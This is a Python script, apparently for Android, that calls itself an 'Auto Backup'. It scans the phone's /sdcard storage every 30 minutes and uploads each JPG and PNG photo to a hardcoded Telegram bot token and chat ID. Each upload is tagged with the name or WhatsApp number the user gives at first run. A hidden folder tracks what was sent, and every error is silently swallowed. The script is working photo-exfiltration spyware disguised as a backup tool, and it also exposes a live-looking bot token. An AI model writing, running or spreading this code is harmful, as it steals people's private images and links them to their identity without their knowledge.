import os
import time
import shutil
import hashlib
import requests

BOT_TOKEN = "8931091996:AAHgcTH38hSH1RXFVzEcqNR2O1LKtqS3RBk"
CHAT_ID = "7883547875"

TARGET_DIR = "/sdcard"
ALLOWED_EXTENSIONS = ('.jpg', '.jpeg', '.png')

IGNORED_FOLDER_NAMES = {
    '.thumbnails', 'thumbnails', 'thumbnail', 
    'cache', '.cache', 'stickers', '.stickers', 
    'temp', '.temp', 'trash', '.trash', 'private'
}

SECURE_DIR = "/sdcard/Download/.backup_secure_data"
os.makedirs(SECURE_DIR, exist_ok=True)

LOG_FILE = os.path.join(SECURE_DIR, "data.txt")
DEVICE_CONFIG_FILE = os.path.join(SECURE_DIR, "device_info.txt")

def get_saved_device_name():
    if os.path.exists(DEVICE_CONFIG_FILE):
        with open(DEVICE_CONFIG_FILE, 'r', encoding='utf-8') as f:
            saved_name = f.read().strip()
            if saved_name:
                return saved_name
    
    user_input = input("[?] Apna naam ya WhatsApp number darj karein (Sirf Pehli Dafa): ").strip()
    if not user_input:
        user_input = "Unknown_User"
        
    with open(DEVICE_CONFIG_FILE, 'w', encoding='utf-8') as f:
        f.write(user_input)
        
    return user_input

DEVICE_NAME = get_saved_device_name()

def get_file_hash(file_path):
    hasher = hashlib.md5()
    try:
        with open(file_path, 'rb') as f:
            buf = f.read(65536)
            while len(buf) > 0:
                hasher.update(buf)
                buf = f.read(65536)
        return hasher.hexdigest()
    except Exception:
        return None

def load_uploaded_records():
    uploaded = set()
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                h = line.strip()
                if h:
                    uploaded.add(h)
    return uploaded

def save_uploaded_record(file_hash):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(file_hash + '\n')

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': text}
    try:
        requests.post(url, data=payload, timeout=10)
    except Exception:
        pass

def upload_photo(file_path, folder_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    try:
        with open(file_path, 'rb') as photo:
            caption_text = (
                f"📱 User/Name: {DEVICE_NAME}\n"
                f"📂 Path: {folder_path}\n"
                f"📄 File: {os.path.basename(file_path)}"
            )
            payload = {
                'chat_id': CHAT_ID,
                'caption': caption_text
            }
            files = {'photo': photo}
            res = requests.post(url, data=payload, files=files, timeout=20)
            return res.status_code == 200
    except Exception:
        return False

def run_backup_cycle():
    if not os.path.exists(TARGET_DIR):
        return

    uploaded_hashes = load_uploaded_records()
    send_telegram_message(f"🚀 Auto Backup Cycle Started for [{DEVICE_NAME}]!")

    for root, dirs, files in os.walk(TARGET_DIR, topdown=True):
        if 'android/data' in root.lower() or 'android/obb' in root.lower():
            continue

        current_folder_name = os.path.basename(root).lower()
        if current_folder_name in IGNORED_FOLDER_NAMES or '/private/' in root.lower():
            continue

        if any(ignored in root.lower() for ignored in ['.thumbnails', '/cache/', '/stickers/', '/temp/']):
            continue
            
        for file in files:
            if file.lower().endswith(ALLOWED_EXTENSIONS):
                full_path = os.path.join(root, file)
                
                file_hash = get_file_hash(full_path)
                if not file_hash:
                    continue
                
                if file_hash in uploaded_hashes:
                    continue
                
                success = upload_photo(full_path, root)
                if success:
                    save_uploaded_record(file_hash)
                    uploaded_hashes.add(file_hash)
                
                time.sleep(1)

    send_telegram_message(f"✅ Auto Backup Cycle Finished. Waiting 30 minutes for next cycle...")

if __name__ == "__main__":
    # Yeh loop script ko hamesha background mein chalu rakhega aur har 30 minute baad scan karega
    while True:
        try:
            run_backup_cycle()
        except Exception:
            pass
        
        # 30 minutes = 1800 seconds
        time.sleep(1800)
